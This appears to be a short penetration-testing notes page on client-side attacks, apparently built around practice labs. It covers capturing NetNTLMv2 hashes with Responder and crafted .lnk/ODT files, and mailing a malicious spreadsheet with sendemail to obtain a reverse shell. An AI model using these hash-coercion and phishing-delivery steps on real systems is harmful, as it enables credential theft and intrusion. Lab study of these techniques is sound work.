# LNK and Client-Side

Minimal Windows shortcut-file notes preserved from the source because they remain useful for client-side delivery and hash-coercion scenarios.
See also `02 Web/Client-Side and Office Payload Delivery.md`.

## .lnk

Grab NetNTLMv2 hash with responder with ‘hashgrab.py’ (in /Desktop/share/ClientSide)

Grab NetNTLMv2 hash with ‘badodt.py’ (in /Desktop/share/ClientSide):

```
python badodt.py
sudo responder -I tun0 -v -A
```

Get reverse shell:

We can craft an odt/ods files in libre like here: [ODT from Craft PG Practice](https://www.notion.so/ODT-from-Craft-PG-Practice-862cd2f384bd4c9da5d8512f59a6b8d3?pvs=21)

via email (like in Hepet):

```
sendemail -f 'jonas@localhost' \
                       -t 'mailadmin@localhost' \
                       -s 192.168.226.140:25 \
                       -u 'Your spreadsheet' \
                       -m 'Here is your requested spreadsheet' \
                       -a test.odt
```

Or just by uploading in a web page like Craft.
